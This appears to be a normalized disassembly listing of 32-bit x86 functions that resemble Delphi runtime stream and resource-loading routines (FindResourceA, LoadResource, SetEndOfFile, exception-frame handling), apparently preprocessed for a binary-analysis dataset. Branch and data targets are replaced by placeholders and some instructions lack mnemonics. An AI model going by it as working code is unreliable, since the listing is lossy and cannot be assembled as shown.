je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_41acec
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4084b4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41ad2c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cd10
pop ebx
pop ebp
retn 0x8
sub_41ad54
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41ad98
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_41ad98
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41aec1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4034f4
movzx edx di
mov eax esi
call sub_4083d8
mov ecx eax
xor edx edx
mov eax ebx
call sub_41ac90
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408454
mov ecx eax
xor edx edx
mov eax ebx
call sub_41ac90
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aec8
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f44
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4085f4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b05c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4085f4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b05c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
jmp r-xdata
sub_41aec8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_41aeec
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
call sub_4084ec
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_41af28
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028d8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41af60
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41af84
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_41afb0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_41afc8
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41a8c0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41aacc
sub_41b000
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41af20
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41b028
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41b000
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b054
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406ae0
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406ac4
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406ab4
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
test ecx ecx
jne r-xdata
sub_41b0e0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028d8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41b000
sub_41b130
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403160
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4043e0
mov ecx eax
mov edx esi
mov eax edi
call sub_41b1f8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b188
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b1eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b1f2
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_41b1f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b188
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41af20
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b188
pop ecx
sub_41b264
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406ab0
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_41b2b4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026dc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b2fc
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026fc
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_41b400
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f74
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f74
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b458
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404010
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404480
mov al 0x1
inc ebx
sub_41b4b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b527
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40578c
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4154b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b52e
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4147fc
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_40578c
mov ecx eax
mov eax esi
pop edx
call sub_40d204
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_40578c
sub_41b534
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41b5da
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b5e1
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404010
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_420c5c
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407e20
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41b5fc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4184cc
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4184cc
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418314
sub_41b634
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4184cc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4184cc
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_418360
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418314
sub_41b67c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41b815
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418834
mov edi eax
xor edx edx
push ebp
push sub_41b7f6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7fd
mov eax [ rw-data ]
call sub_418898
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41b7d7
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41b785
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_418470
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_417e30
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b78c
mov eax [ ebp - 0x8 ]
call sub_403190
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414a84
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b5fc
pop ecx
mov edx esi
mov eax edi
call sub_418360
mov eax ebx
call sub_403190
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41b534
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b634
pop ecx
inc esi
sub_41b78c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403190
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418470
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
sub_41b824
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418834
mov edi eax
xor eax eax
push ebp
push sub_41b8bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418898
retn
mov edx ebx
mov eax edi
call sub_418470
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_418360
mov eax esi
call sub_403190
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407e20
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41b8d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418834
mov edi eax
xor eax eax
push ebp
push sub_41b947
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418898
retn
mov edx ebx
mov eax edi
call sub_418470
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_418360
mov eax esi
call sub_403190
sub_41b978
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
pop ecx
pop edx
pop ebx
retn
sub_41b9bc
push ebx
push esi
push edi
call sub_40355c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b2fc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_41b9f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41d8d0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41d9e0
call sub_41b96c
sub_41ba1c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407e20
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f20
sub_41ba50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407e20
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d8d0
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bb11
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41be94
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41be94
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb18
mov eax [ ebp - 0x8 ]
call sub_403190
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41d9e0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41b96c
sub_41bb40
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41bb60
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4041bc
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403414
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41b96c
sub_41bbc8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418834
mov esi eax
xor edx edx
push ebp
push sub_41bc38
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc3f
mov eax [ rw-data ]
call sub_418898
retn
mov edx ebx
mov eax esi
call sub_418470
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403190
mov edx ebx
mov eax esi
call sub_418360
sub_41bc44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bd53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd5a
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
xor edx edx
push ebp
push sub_41bd36
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bd88
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41b458
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418470
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403fb8
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41b534
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418470
call sub_41bbc8
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418470
mov edx eax
mov eax [ rw-data ]
call sub_4187ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4185bc
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41bd64
push ebx
mov ebx eax
mov eax ebx
call sub_41be58
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41a8c0
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41bd88
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403190
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_418470
call sub_403190
inc edi
dec esi
jne r-xdata
sub_41bdc4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4030d8
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_4178fc
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40311c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_417974
mov edi eax
mov edx [ esp + 0x4 ]
call sub_417874
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4030f4
test al al
jne r-xdata
sub_41be94
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41bee0
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41bee0
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_41bf30
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41bf7b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d730
mov eax [ ebp - 0x4 ]
call sub_4041e0
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
